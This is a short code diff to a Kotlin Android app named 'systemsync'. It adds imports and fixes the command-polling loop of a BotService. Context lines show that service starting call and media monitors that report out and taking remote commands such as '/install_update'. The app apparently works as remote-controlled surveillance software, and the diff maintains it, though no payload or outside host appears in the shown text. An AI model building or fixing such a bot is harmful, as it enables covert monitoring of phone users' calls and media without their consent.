@@ -28,6 +28,7 @@ import androidx.core.content.ContextCompat
 import androidx.core.content.FileProvider
 import com.example.systemsync.databinding.ActivityMainBinding
 import kotlinx.coroutines.*
+import kotlinx.coroutines.tasks.await
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -45,6 +46,7 @@ import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
+import kotlin.concurrent.thread
 
 // ============================================================
 // 1) MainActivity
@@ -1183,7 +1185,7 @@ class BotService : Service() {
         }
         callMonitor = CallMonitor(this, cfg) { text -> reply(text) }.also { it.start() }
         mediaWatcher = MediaWatcher(this) { text -> if (cfg.eventsOn) reply(text) }.also { it.start() }
-        while (isActive) {
+        while (scope.isActive) {
             try {
                 for (cmd in worker.poll(this)) {
                     if (cmd == "/install_update") {
